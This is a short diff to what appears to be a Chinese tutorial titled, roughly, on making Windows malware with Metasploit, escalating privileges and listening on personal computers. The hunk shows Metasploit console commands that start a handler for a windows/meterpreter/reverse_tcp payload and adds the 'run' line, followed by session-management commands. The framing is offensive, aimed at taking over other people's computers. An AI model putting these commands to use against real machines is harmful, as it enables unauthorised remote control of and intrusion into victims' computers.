@@ -68,6 +68,7 @@ Metasploit木马命令制作windows恶意软件提权监听个人电脑
 ~~~
 use exploit/multi/handler
 set payload  windows/meterpreter/reverse_tcp
+run
 help
 backgroud
 sessions
